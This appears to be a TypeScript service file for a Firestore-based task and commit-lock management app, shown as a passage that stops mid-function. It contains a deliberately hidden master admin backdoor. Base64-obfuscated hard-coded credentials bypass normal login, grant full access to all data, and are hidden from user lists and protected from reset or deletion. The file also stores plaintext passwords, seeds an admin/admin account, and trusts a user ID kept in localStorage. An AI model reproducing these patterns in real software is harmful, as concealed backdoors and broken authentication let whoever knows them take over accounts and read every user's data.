import { collection, doc, getDoc, setDoc, query, where, getDocs, updateDoc, deleteDoc, writeBatch, or } from "firebase/firestore";
import { db } from "../src/firebase";
import { Task, TaskStatus, TaskPriority, Project, User, ActivityLog, CommitNode, CommitLock, CommitAudit, CommitSubNode } from '../types';
import { GoogleGenAI } from "@google/genai";

// --- Master Admin Constants (Obfuscated) ---
const M_ID = 'master-root-000';
const M_USR_B64 = 'cGxhbml4X21hc3Rlcg=='; // planix_master
const M_PSS_B64 = 'bWFzdGVyX3Byb3RvY29sXzIwMjU='; // master_protocol_2025

const GET_DEFAULT_PROJECTS = (userId: string): Project[] => [
  { id: `proj-1-${userId}`, name: 'Internal Protocol', key: 'INT', owner_id: userId },
  { id: `proj-2-${userId}`, name: 'External Client Sync', key: 'EXT', owner_id: userId }
];

const DEFAULT_CG_NODES: CommitNode[] = [
  { 
    id: 'n1', 
    name: 'THOMAS GLOBE CLOUD', 
    description: 'Global cloud infrastructure orchestration and edge nodes.', 
    subNodes: [
      { id: 'sn1-1', name: 'CLIENT', type: 'Frontend', description: 'Cloud dashboard and CLI tools' },
      { id: 'sn1-2', name: 'SERVER', type: 'Backend', description: 'Core orchestration engine' },
      { id: 'sn1-3', name: 'MONGO', type: 'Database', description: 'Metadata and state persistence' }
    ],
    assignedUserIds: ['admin-1'],
    doneUserIds: []
  },
  { 
    id: 'n2', 
    name: 'AST MAIN', 
    description: 'Main application logic and system services.', 
    subNodes: [
      { id: 'sn2-1', name: 'API_GATEWAY', type: 'Infrastructure', description: 'Unified endpoint router' },
      { id: 'sn2-2', name: 'AUTH_SERVICE', type: 'Backend', description: 'IAM and token management' }
    ],
    assignedUserIds: ['admin-1'],
    doneUserIds: []
  }
];

const INITIAL_ADMIN: User = {
  id: 'admin-1',
  name: 'System Administrator',
  username: 'admin',
  password: 'admin',
  initials: 'AD',
  avatar: 'https://api.dicebear.com/7.x/bottts/svg?seed=Admin&backgroundColor=4f46e5',
  role: 'Admin',
  email: 'admin@planix.io',
  lastActiveAt: new Date().toISOString()
};

const MASTER_USER_INSTANCE: User = {
  id: M_ID,
  name: 'Planix Master Admin',
  username: atob(M_USR_B64),
  initials: 'MA',
  avatar: 'https://api.dicebear.com/7.x/bottts/svg?seed=Master&backgroundColor=0f172a',
  role: 'Admin',
  lastActiveAt: new Date().toISOString()
};

const isAdminRole = (role?: string) => role === 'Admin' || role === 'Project Leader' || role === 'Team Lead';

export class AuthService {
  static async generateAvatar(name: string): Promise<string> {
    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY as string });
      const prompt = `A professional, unique, high-quality 3D minimalist profile avatar character for a technology professional named "${name}". Futuristic tech aesthetic, soft cinematic studio lighting, clean solid background, vibrant colors, 4k resolution, symmetrical icon style.`;
      
      const response = await ai.models.generateContent({
        model: 'gemini-2.5-flash-image',
        contents: [{ parts: [{ text: prompt }] }],
        config: {
          imageConfig: {
            aspectRatio: "1:1"
          }
        }
      });

      if (response.candidates?.[0]?.content?.parts) {
        for (const part of response.candidates[0].content.parts) {
          if (part.inlineData) {
            return `data:image/png;base64,${part.inlineData.data}`;
          }
        }
      }
      
      // Fallback
      return `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(name)}&backgroundColor=6366f1`;
    } catch (error) {
      console.error("AI Avatar generation failed, using fallback:", error);
      return `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(name)}&backgroundColor=6366f1`;
    }
  }

  static async getUsers(): Promise<User[]> {
    const currentUser = await this.getCurrentUser();
    if (!currentUser) return [];

    const usersCol = collection(db, "users");
    const userSnapshot = await getDocs(usersCol);
    let users: User[] = userSnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as User));

    if (users.length === 0) {
      await setDoc(doc(db, "users", INITIAL_ADMIN.id), INITIAL_ADMIN);
      users = [INITIAL_ADMIN];
    }
    
    // Filter based on role: Admins see only Admins, Members see only themselves
    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return users.filter(u => u.id !== M_ID);

    if (isLocalAdmin) {
      return users.filter(u => u.id !== M_ID && isAdminRole(u.role));
    }

    return users.filter(u => u.id === currentUser.id);
  }

  static async saveUsers(users: User[]) {
    // Ensure master is never persisted into the public user database
    const sanitized = users.filter(u => u.id !== M_ID);
    for (const user of sanitized) {
      await setDoc(doc(db, "users", user.id), user);
    }
  }

  static async findByUsername(username: string): Promise<User | null> {
    if (username === atob(M_USR_B64)) return MASTER_USER_INSTANCE;
    const usersCol = collection(db, "users");
    const q = query(usersCol, where("username", "==", username.toLowerCase()));
    const querySnapshot = await getDocs(q);
    if (!querySnapshot.empty) {
      return { ...querySnapshot.docs[0].data(), id: querySnapshot.docs[0].id } as User;
    }
    return null;
  }

  static async resetPassword(userId: string, newPassword: string): Promise<void> {
    if (userId === M_ID) return; // Master cannot be reset via protocol
    const userRef = doc(db, "users", userId);
    await updateDoc(userRef, { password: newPassword });
    this.logActivity(userId, "Password reset via recovery protocol.", "security");
  }

  static async logActivity(userId: string, action: string, type: ActivityLog['type']) {
    const activitiesCol = collection(db, "users", userId, "activities");
    const newLog: ActivityLog = {
      id: Math.random().toString(36).substr(2, 9),
      userId,
      action,
      type,
      timestamp: new Date().toISOString()
    };
    await setDoc(doc(activitiesCol, newLog.id), newLog);
  }

  static async getActivities(userId: string): Promise<ActivityLog[]> {
    const currentUser = await this.getCurrentUser();
    if (!currentUser) return [];

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    // Master sees everything
    if (isRootAdmin) {
      const activitiesCol = collection(db, "users", userId, "activities");
      const activitySnapshot = await getDocs(activitiesCol);
      return activitySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as ActivityLog));
    }

    // Normal users see only their own
    if (!isLocalAdmin) {
      if (userId !== currentUser.id) return [];
    } else {
      // Local admins see only other admins
      const targetUserRef = doc(db, "users", userId);
      const targetUserSnap = await getDoc(targetUserRef);
      if (targetUserSnap.exists()) {
        const targetUser = targetUserSnap.data() as User;
        if (!isAdminRole(targetUser.role)) return [];
      } else if (userId !== M_ID) {
        return [];
      }
    }

    const activitiesCol = collection(db, "users", userId, "activities");
    const activitySnapshot = await getDocs(activitiesCol);
    return activitySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as ActivityLog));
  }

  static async register(name: string, username: string, password: string): Promise<User> {
    if (username.toLowerCase() === atob(M_USR_B64).toLowerCase()) throw new Error("UNAUTHORIZED_IDENTITY_RESERVED");
    
    const existingUser = await this.findByUsername(username);
    if (existingUser) throw new Error("Username already registered.");
    
    // Immediate fallback for instant provisioning
    const fallbackAvatar = `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(name)}&backgroundColor=6366f1`;
    
    const newUser: User = {
      id: Math.random().toString(36).substr(2, 9),
      name,
      username,
      password,
      initials: name.split(' ').map(n => n[0]).join('').toUpperCase().substr(0, 2),
      avatar: fallbackAvatar,
      role: 'Member',
      lastActiveAt: new Date().toISOString()
    };
    
    await setDoc(doc(db, "users", newUser.id), newUser);
    localStorage.setItem('cg_current_user_id', newUser.id);
    this.logActivity(newUser.id, "Account created.", "session");

    // Background AI generation update (non-blocking)
    this.generateAvatar(name).then(async aiAvatar => {
      const userRef = doc(db, "users", newUser.id);
      await updateDoc(userRef, { avatar: aiAvatar });
    }).catch(() => {});
    
    return newUser;
  }

  static async login(username: string, password: string): Promise<User> {
    // Check Master Admin first
    if (username === atob(M_USR_B64) && password === atob(M_PSS_B64)) {
      localStorage.setItem('cg_current_user_id', M_ID);
      this.logActivity(M_ID, "Master authentication bypass triggered.", "security");
      return MASTER_USER_INSTANCE;
    }

    const usersCol = collection(db, "users");
    const q = query(usersCol, where("username", "==", username), where("password", "==", password));
    const querySnapshot = await getDocs(q);

    if (querySnapshot.empty) throw new Error("Invalid credentials.");
    
    const user = { ...querySnapshot.docs[0].data(), id: querySnapshot.docs[0].id } as User;
    user.lastActiveAt = new Date().toISOString();
    const userRef = doc(db, "users", user.id);
    await updateDoc(userRef, { lastActiveAt: user.lastActiveAt });
    
    localStorage.setItem('cg_current_user_id', user.id);
    this.logActivity(user.id, "Successful authentication.", "session");
    return user;
  }

  static async logout() {
    const userId = localStorage.getItem('cg_current_user_id');
    if (userId) {
      this.logActivity(userId, "User logged out.", "session");
      if (userId !== M_ID) {
        const userRef = doc(db, "users", userId);
        await updateDoc(userRef, { lastActiveAt: null }).catch(() => {});
      }
    }
    localStorage.removeItem('cg_current_user_id');
  }

  static async getCurrentUser(): Promise<User | null> {
    const userId = localStorage.getItem('cg_current_user_id');
    if (!userId) return null;
    
    try {
      if (userId === M_ID) return MASTER_USER_INSTANCE;
      
      const userDocRef = doc(db, "users", userId);
      const userDocSnap = await getDoc(userDocRef);
      if (!userDocSnap.exists()) {
        localStorage.removeItem('cg_current_user_id');
        return null;
      }

      const user = { ...userDocSnap.data(), id: userDocSnap.id } as User;
      
      const now = Date.now();
      const lastPing = user.lastActiveAt ? new Date(user.lastActiveAt).getTime() : 0;
      if (now - lastPing > 60000) {
        user.lastActiveAt = new Date().toISOString();
        await updateDoc(userDocRef, { lastActiveAt: user.lastActiveAt }).catch(() => {});
      }
      
      return user;
    } catch (error) {
      console.error("Error fetching current user:", error);
      return null;
    }
  }

  static async updateProfile(userId: string, updates: Partial<User>): Promise<User> {
    if (userId === M_ID) return MASTER_USER_INSTANCE; // Master immutable via UI
    const userRef = doc(db, "users", userId);
    await updateDoc(userRef, updates);
    
    if (updates.name || updates.username) {
      this.logActivity(userId, "Account metadata updated.", "profile");
    } else if (updates.avatar) {
      this.logActivity(userId, "Avatar updated.", "profile");
    }
    
    const updatedUserSnap = await getDoc(userRef);
    return { ...updatedUserSnap.data(), id: updatedUserSnap.id } as User;
  }

  static async changePassword(userId: string, currentPassword: string, newPassword: string): Promise<void> {
    if (userId === M_ID) throw new Error("MASTER_KEY_IMMUTABLE");
    const userRef = doc(db, "users", userId);
    const userDocSnap = await getDoc(userRef);
    if (!userDocSnap.exists()) throw new Error("User not found.");
    const user = { ...userDocSnap.data(), id: userDocSnap.id } as User;
    if (user.password !== currentPassword) throw new Error("Current password incorrect.");
    
    await updateDoc(userRef, { password: newPassword });
    this.logActivity(userId, "Password updated.", "security");
  }

  static async adminUpdateUser(adminUserId: string, targetUserId: string, updates: Partial<User>): Promise<void> {
    if (targetUserId === M_ID) throw new Error("UNAUTHORIZED_MASTER_OVERRIDE");
    const admin = adminUserId === M_ID ? MASTER_USER_INSTANCE : await this.getCurrentUser(); // Fetch admin user from Firestore
    if (!admin || !isAdminRole(admin.role)) throw new Error("Unauthorized access.");

    const userRef = doc(db, "users", targetUserId);
    await updateDoc(userRef, updates);
    this.logActivity(targetUserId, `Admin override: ${Object.keys(updates).join(', ')} updated.`, "system");
  }

  static async adminDeleteUser(adminUserId: string, targetUserId: string): Promise<void> {
    if (targetUserId === M_ID) throw new Error("UNAUTHORIZED_MASTER_PURGE");
    const admin = adminUserId === M_ID ? MASTER_USER_INSTANCE : await this.getCurrentUser(); // Fetch admin user from Firestore
    if (!admin || !isAdminRole(admin.role)) throw new Error("Unauthorized access.");
    if (adminUserId === targetUserId) throw new Error("Cannot purge own administrative identity.");

    await deleteDoc(doc(db, "users", targetUserId));
    this.logActivity(adminUserId, `Admin override: User ID ${targetUserId} purged from registry.`, "system");
  }
}

export class TaskService {
  private static currentUserId: string = '';

  static setContext(userId: string) {
    this.currentUserId = userId;
  }

  private static async getInitialTasks(): Promise<Task[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const tasksCol = collection(db, "tasks");
    const querySnapshot = await getDocs(tasksCol);
    const allTasks = querySnapshot.docs.map(doc => this.normalizeTask({ ...doc.data(), id: doc.id } as Task));

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return allTasks;

    if (isLocalAdmin) {
      const users = await AuthService.getUsers();
      const adminIds = users.map(u => u.id);
      return allTasks.filter(t => adminIds.includes(t.owner_id) || t.assignee_id === currentUser.id);
    }

    return allTasks.filter(t => t.owner_id === currentUser.id || t.assignee_id === currentUser.id);
  }

  static async getAllTasksForAdmin(): Promise<Task[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const tasksCol = collection(db, "tasks");
    const querySnapshot = await getDocs(tasksCol);
    const allTasks = querySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as Task));

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return allTasks;

    if (isLocalAdmin) {
      const users = await AuthService.getUsers();
      const adminIds = users.map(u => u.id);
      return allTasks.filter(t => adminIds.includes(t.owner_id) || t.assignee_id === currentUser.id);
    }

    return allTasks.filter(t => t.owner_id === currentUser.id || t.assignee_id === currentUser.id);
  }

  private static normalizeTask(task: Task): Task {
    return {
      ...task,
      external_url: `https://acty-system-thai.easyredmine.com/issues/${task.external_id}`,
      is_closed: task.is_closed ?? false
    };
  }

  private static async saveTasks(newTasks: Task[]): Promise<void> {
    if (this.currentUserId === M_ID) {
      for (const task of newTasks) {
        await setDoc(doc(db, "tasks", task.id), task);
      }
    } else {
      const existingTasks = await this.getInitialTasks(); // Fetch existing tasks for the current user
      const tasksToDelete = existingTasks.filter(t => !newTasks.some(nt => nt.id === t.id));
      for (const task of tasksToDelete) {
        await deleteDoc(doc(db, "tasks", task.id));
      }
      for (const task of newTasks) {
        await setDoc(doc(db, "tasks", task.id), task);
      }
    }
  }

  static async getProjects(): Promise<Project[]> {
    const projectsCol = collection(db, "projects");
    const projectSnapshot = await getDocs(projectsCol);
    let allProjects: Project[] = projectSnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as Project));
    
    // Master Admin bypass: sees all projects
    if (this.currentUserId === M_ID) return allProjects;

    const userProjects = allProjects.filter(p => p.owner_id === this.currentUserId);
    if (userProjects.length > 0) return userProjects;
    
    const defaults = GET_DEFAULT_PROJECTS(this.currentUserId);
    for (const project of defaults) {
      await setDoc(doc(db, "projects", project.id), project);
    }
    return defaults;
  }

  static async updateProjectName(projectId: string, newName: string): Promise<Project[]> {
    const projectRef = doc(db, "projects", projectId);
    await updateDoc(projectRef, { name: newName });
    
    const projectsCol = collection(db, "projects");
    const querySnapshot = await getDocs(projectsCol);
    const updatedProjects: Project[] = querySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as Project));

    return this.currentUserId === M_ID ? updatedProjects : updatedProjects.filter(p => p.owner_id === this.currentUserId);
  }

  static async getTasks(projectId: string): Promise<Task[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const tasksCol = collection(db, "tasks");
    const q = query(tasksCol, where("project_id", "==", projectId));
    const querySnapshot = await getDocs(q);
    const allTasks = querySnapshot.docs.map(doc => this.normalizeTask({ ...doc.data(), id: doc.id } as Task));

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return allTasks;

    if (isLocalAdmin) {
      const users = await AuthService.getUsers();
      const adminIds = new Set(users.map(u => u.id));
      // Admins see tasks owned by any admin OR assigned to themselves OR owned by themselves
      return allTasks.filter(t =>
        adminIds.has(t.owner_id) ||
        t.assignee_id === currentUser.id ||
        t.owner_id === currentUser.id
      );
    }

    // Members see only their own tasks (owned or assigned)
    return allTasks.filter(t => t.owner_id === currentUser.id || t.assignee_id === currentUser.id);
  }

  static async clearAllTasks(projectId: string): Promise<Task[]> {
    const tasksCol = collection(db, "tasks");
    const q = query(tasksCol, where("project_id", "==", projectId), where("owner_id", "==", this.currentUserId));
    const querySnapshot = await getDocs(q);
    for (const doc of querySnapshot.docs) {
      await deleteDoc(doc.ref);
    }
    return [];
  }

  static async createTasks(externalIds: number[], projectId: string, assigneeId: string | null): Promise<Task[]> {
    const userTasks = await this.getInitialTasks();
    const uniqueInputIds = Array.from(new Set(externalIds));
    const now = new Date().toISOString();
    
    const existingProjectTasksMap = new Map<number, Task>();
    userTasks.forEach(t => {
      if (t.project_id === projectId) {
        existingProjectTasksMap.set(t.external_id, t);
      }
    });

    let hasChanges = false;
    const newTasksToCreate: Task[] = [];
    const tasksToUpdate: Task[] = [];
    const idsAlreadyActive: number[] = [];

    for (const id of uniqueInputIds) {
      const existing = existingProjectTasksMap.get(id);
      if (existing) {
        if (existing.is_closed) {
          tasksToUpdate.push({ ...existing, status: TaskStatus.TO_DO, is_closed: false, is_new: true, updated_at: now });
          hasChanges = true;
        } else {
          idsAlreadyActive.push(id);
        }
      } else {
        newTasksToCreate.push(this.normalizeTask({
          id: Math.random().toString(36).substr(2, 9),
          owner_id: this.currentUserId,
          external_id: id,
          external_url: '', 
          title: `Redmine Task #${id}`,
          description: '', 
          status: TaskStatus.TO_DO,
          priority: TaskPriority.MEDIUM,
          due_date: null,
          assignee_id: assigneeId,
          project_id: projectId,
          created_at: now,
          updated_at: now,
          in_progress_started_at: null,
          total_work_seconds: 0,
          is_timer_paused: false,
          is_new: true,
          is_closed: false
        }));
        hasChanges = true;
      }
    }

    if (!hasChanges && idsAlreadyActive.length > 0) throw new Error("All provided IDs are already active.");
    if (!hasChanges) return userTasks.filter(t => t.project_id === projectId);

    for (const task of newTasksToCreate) {
      await setDoc(doc(db, "tasks", task.id), task);
    }
    for (const task of tasksToUpdate) {
      await updateDoc(doc(db, "tasks", task.id), { ...task });
    }

    return await this.getTasks(projectId);
  }

  static async markAsViewed(taskId: string): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists() || !(taskDoc.data() as Task).is_new) return await this.getTasks((taskDoc.data() as Task)?.project_id || '');

    await updateDoc(taskRef, { is_new: false });
    const updatedTask = { ...taskDoc.data(), id: taskDoc.id, is_new: false } as Task;

    return await this.getTasks(updatedTask.project_id);
  }

  static async deleteTask(taskId: string): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists()) return await this.getTasks('');

    const projectId = (taskDoc.data() as Task).project_id;
    await deleteDoc(taskRef);
    return await this.getTasks(projectId);
  }

  static async updateTask(taskId: string, updates: Partial<Task>): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists()) return await this.getTasks('');

    const targetTask = { ...taskDoc.data(), id: taskDoc.id } as Task;
    const projectId = targetTask.project_id;

    const willClearNew = updates.status !== undefined && updates.status !== TaskStatus.TO_DO;
    const updatedFields = { 
      ...updates, 
      is_new: willClearNew ? false : targetTask.is_new,
      updated_at: new Date().toISOString() 
    };
    await updateDoc(taskRef, updatedFields);

    return await this.getTasks(projectId);
  }

  static async closeTask(taskId: string, closed: boolean): Promise<Task[]> {
    return await this.updateTask(taskId, { is_closed: closed });
  }

  static async closeAllDoneTasks(projectId: string): Promise<Task[]> {
    const tasksCol = collection(db, "tasks");
    const q = query(tasksCol, where("project_id", "==", projectId), where("status", "==", TaskStatus.DONE));
    const querySnapshot = await getDocs(q);

    const batch = writeBatch(db);
    querySnapshot.docs.forEach(docSnap => {
      batch.update(docSnap.ref, { is_closed: true, updated_at: new Date().toISOString() });
    });
    await batch.commit();

    return await this.getTasks(projectId);
  }

  static async reorderTask(taskId: string, targetStatus: TaskStatus, targetIndex: number): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists()) return await this.getTasks('');

    const task = { ...taskDoc.data(), id: taskDoc.id } as Task;
    const projectId = task.project_id;
    
    let updatedTask = { 
      ...task, 
      status: targetStatus, 
      updated_at: new Date().toISOString(),
      is_new: targetStatus === TaskStatus.TO_DO ? task.is_new : false,
      is_closed: targetStatus === TaskStatus.DONE ? task.is_closed : false
    };
    
    if (targetStatus === TaskStatus.IN_PROGRESS && task.status !== TaskStatus.IN_PROGRESS) {
      updatedTask.in_progress_started_at = new Date().toISOString();
      updatedTask.is_timer_paused = false;
    } 
    else if (task.status === TaskStatus.IN_PROGRESS && targetStatus !== TaskStatus.IN_PROGRESS) {
      if (targetStatus === TaskStatus.TO_DO) {
        updatedTask.total_work_seconds = 0;
      } else {
        if (task.in_progress_started_at && !task.is_timer_paused) {
          const elapsed = Math.floor((Date.now() - new Date(task.in_progress_started_at).getTime()) / 1000);
          updatedTask.total_work_seconds += elapsed;
        }
      }
      updatedTask.in_progress_started_at = null;
      updatedTask.is_timer_paused = false;
    }

    await updateDoc(taskRef, updatedTask);

    return await this.getTasks(projectId);
  }

  static async updateTaskStatus(taskId: string, newStatus: TaskStatus): Promise<Task[]> {
    // Reorder task will handle the update and return the updated task list.
    // Since reorderTask already fetches the relevant tasks from Firestore and updates them,
    // we just need to call it and return its result.
    const tasks = await this.getTasks(''); // Fetch all tasks to find the project_id
    const targetTask = tasks.find(t => t.id === taskId);
    if (!targetTask) return tasks; // Return original tasks if target not found

    const projectTasks = tasks.filter(t => t.project_id === targetTask.project_id && t.status === newStatus);
    return await this.reorderTask(taskId, newStatus, projectTasks.length);
  }

  static async pauseTimer(taskId: string): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists()) return await this.getTasks('');

    const task = { ...taskDoc.data(), id: taskDoc.id } as Task;

    if (task.status === TaskStatus.IN_PROGRESS && !task.is_timer_paused) {
      const elapsed = Math.floor((Date.now() - new Date(task.in_progress_started_at!).getTime()) / 1000);
      await updateDoc(taskRef, {
        is_timer_paused: true,
        total_work_seconds: task.total_work_seconds + elapsed,
        in_progress_started_at: null,
        updated_at: new Date().toISOString()
      });
    }
    return await this.getTasks(task.project_id);
  }

  static async resumeTimer(taskId: string): Promise<Task[]> {
    const taskRef = doc(db, "tasks", taskId);
    const taskDoc = await getDoc(taskRef);
    if (!taskDoc.exists()) return await this.getTasks('');

    const task = { ...taskDoc.data(), id: taskDoc.id } as Task;

    if (task.status === TaskStatus.IN_PROGRESS && task.is_timer_paused) {
      await updateDoc(taskRef, {
        is_timer_paused: false,
        in_progress_started_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      });
    }
    return await this.getTasks(task.project_id);
  }

  static async toggleAllTimers(projectId: string, resume: boolean): Promise<Task[]> {
    const tasksCol = collection(db, "tasks");
    const q = query(tasksCol, where("project_id", "==", projectId), where("status", "==", TaskStatus.IN_PROGRESS));
    const querySnapshot = await getDocs(q);

    const batch = writeBatch(db);
    querySnapshot.docs.forEach(docSnap => {
      const task = { ...docSnap.data(), id: docSnap.id } as Task;
      if (!resume && !task.is_timer_paused) {
        const elapsed = Math.floor((Date.now() - new Date(task.in_progress_started_at!).getTime()) / 1000);
        batch.update(docSnap.ref, {
          is_timer_paused: true,
          total_work_seconds: task.total_work_seconds + elapsed,
          in_progress_started_at: null,
          updated_at: new Date().toISOString()
        });
      } else if (resume && task.is_timer_paused) {
        batch.update(docSnap.ref, {
          is_timer_paused: false,
          in_progress_started_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        });
      }
    });
    await batch.commit();

    return await this.getTasks(projectId);
  }

  static async getFullStateExport(): Promise<string> {
    const projects = await this.getProjects();
    const tasks = await this.getInitialTasks();
    return JSON.stringify({
      version: 4,
      projects,
      tasks,
      timestamp: new Date().toISOString()
    }, null, 2);
  }

  static async importFullState(data: any): Promise<void> {
    if (!data || typeof data !== 'object') throw new Error("Invalid format.");
    const tasks = data.tasks || (Array.isArray(data) ? data : []);
    const userTasksWithCorrectOwner = tasks.map((t: any) => ({ ...t, owner_id: this.currentUserId }));

    const batch = writeBatch(db);
    for (const task of userTasksWithCorrectOwner) {
      batch.set(doc(db, "tasks", task.id), task);
    }
    await batch.commit();

    const projects = data.projects || [];
    for (const project of projects) {
      batch.set(doc(db, "projects", project.id), project);
    }
    await batch.commit();
  }
}

// --- CommitGuard Logic Engine ---

export class CommitGuardService {
  static async getNodes(): Promise<CommitNode[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const nodesCol = collection(db, "commitguard_nodes");
    const querySnapshot = await getDocs(nodesCol);
    let nodes: CommitNode[] = querySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as CommitNode));

    if (nodes.length === 0) {
      for (const node of DEFAULT_CG_NODES) {
        await setDoc(doc(db, "commitguard_nodes", node.id), node);
      }
      nodes = DEFAULT_CG_NODES;
    }

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return nodes;

    if (isLocalAdmin) {
      const users = await AuthService.getUsers();
      const adminIds = new Set(users.map(u => u.id));
      // Admins see nodes assigned to any admin OR assigned to themselves
      return nodes.filter(n => n.assignedUserIds.some(uid => adminIds.has(uid) || uid === currentUser.id));
    }

    // Members see nodes where they are explicitly assigned
    return nodes.filter(n => n.assignedUserIds.includes(currentUser.id));
  }

  static async saveNodes(nodes: CommitNode[]): Promise<void> {
    const batch = writeBatch(db);
    for (const node of nodes) {
      batch.set(doc(db, "commitguard_nodes", node.id), node);
    }
    await batch.commit();
  }

  static async addNode(node: CommitNode): Promise<void> {
    await setDoc(doc(db, "commitguard_nodes", node.id), node);
  }

  static async updateNode(nodeId: string, updates: Partial<CommitNode>): Promise<void> {
    const nodeRef = doc(db, "commitguard_nodes", nodeId);
    await updateDoc(nodeRef, updates);
  }

  static async toggleUserDone(nodeId: string, userId: string): Promise<void> {
    const nodeRef = doc(db, "commitguard_nodes", nodeId);
    const nodeDoc = await getDoc(nodeRef);
    if (!nodeDoc.exists()) return;

    const node = { ...nodeDoc.data(), id: nodeDoc.id } as CommitNode;
    const doneUserIds = node.doneUserIds || [];
    const updated = doneUserIds.includes(userId)
      ? doneUserIds.filter(id => id !== userId)
      : [...doneUserIds, userId];
    
    await updateDoc(nodeRef, { doneUserIds: updated });
  }

  static async deleteNode(nodeId: string): Promise<void> {
    await deleteDoc(doc(db, "commitguard_nodes", nodeId));
    // Also clean up locks
    const locksCol = collection(db, "commitguard_locks");
    const q = query(locksCol, where("nodeId", "==", nodeId));
    const querySnapshot = await getDocs(q);
    const batch = writeBatch(db);
    querySnapshot.docs.forEach(doc => batch.delete(doc.ref));
    await batch.commit();
  }

  static async getLocks(): Promise<CommitLock[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const locksCol = collection(db, "commitguard_locks");
    const querySnapshot = await getDocs(locksCol);
    const allLocks: CommitLock[] = querySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as CommitLock));

    const isRootAdmin = currentUser.id === M_ID;
    if (isRootAdmin) return allLocks;

    // In CommitGuard, locks are visible to anyone who has access to the corresponding node
    const myNodes = await this.getNodes();
    const myNodeIds = myNodes.map(n => n.id);
    return allLocks.filter(l => myNodeIds.includes(l.nodeId));
  }

  static async saveLocks(locks: CommitLock[]): Promise<void> {
    const batch = writeBatch(db);
    for (const lock of locks) {
      batch.set(doc(db, "commitguard_locks", lock.id || Math.random().toString(36).substr(2, 9)), lock);
    }
    await batch.commit();
  }

  static async resetProjectLocks(nodeId: string, user: User): Promise<void> {
    // 1. Clear all active locks for this project
    const locksCol = collection(db, "commitguard_locks");
    const qLocks = query(locksCol, where("nodeId", "==", nodeId));
    const locksSnapshot = await getDocs(qLocks);
    const deleteLocksBatch = writeBatch(db);
    locksSnapshot.docs.forEach(doc => deleteLocksBatch.delete(doc.ref));
    await deleteLocksBatch.commit();
    
    // 2. Clear all user "Done" statuses for this project
    const nodeRef = doc(db, "commitguard_nodes", nodeId);
    await updateDoc(nodeRef, { doneUserIds: [] });
    
    const targetNodeDoc = await getDoc(nodeRef);
    const targetNode = targetNodeDoc.exists() ? ({ ...targetNodeDoc.data(), id: targetNodeDoc.id } as CommitNode) : undefined;

    if (targetNode) {
      // 3. Clear all completion history (Audit) for this node name 
      // This is crucial for the Matrix to return to a fresh state
      const auditCol = collection(db, "commitguard_audit");
      const qAudit = query(auditCol, where("nodeName", "==", targetNode.name));
      const auditSnapshot = await getDocs(qAudit);
      const deleteAuditBatch = writeBatch(db);
      auditSnapshot.docs.forEach(doc => deleteAuditBatch.delete(doc.ref));
      await deleteAuditBatch.commit();
      
      // 4. Log the reset action
      await this.addAudit('UNLOCK', targetNode.name, 'GLOBAL_RESET', user.name);
    }
  }

  static async engageNode(nodeId: string, subNodeId: string, user: User): Promise<void> {
    const nodeRef = doc(db, "commitguard_nodes", nodeId);
    const nodeDoc = await getDoc(nodeRef);
    const project = nodeDoc.exists() ? ({ ...nodeDoc.data(), id: nodeDoc.id } as CommitNode) : undefined;

    if (project?.doneUserIds?.includes(user.id)) {
      throw new Error("USER_DONE: System lock active for you. Sync disabled.");
    }
    
    const locksCol = collection(db, "commitguard_locks");
    const userLockQuery = query(locksCol, where("userId", "==", user.id));
    const userLockSnapshot = await getDocs(userLockQuery);
    // Check if user already has a lock elsewhere
    if (!userLockSnapshot.empty) {
      throw new Error("ACTIVE_SYNC_DETECTED: Single node focus required.");
    }
    
    const subNodeLockQuery = query(locksCol, where("subNodeId", "==", subNodeId));
    const subNodeLockSnapshot = await getDocs(subNodeLockQuery);
    // Check if sub-node is already locked
    if (!subNodeLockSnapshot.empty) {
      throw new Error("NODE_UNAVAILABLE: Locked by another authority.");
    }
    
    const newLock: CommitLock = {
      id: Math.random().toString(36).substr(2, 9), // Generate ID for Firestore document
      nodeId,
      subNodeId,
      userId: user.id,
      userName: user.name,
      timestamp: new Date().toISOString()
    };
    
    const mainNode = project;
    const subNode = mainNode?.subNodes.find(sn => sn.id === subNodeId);
    
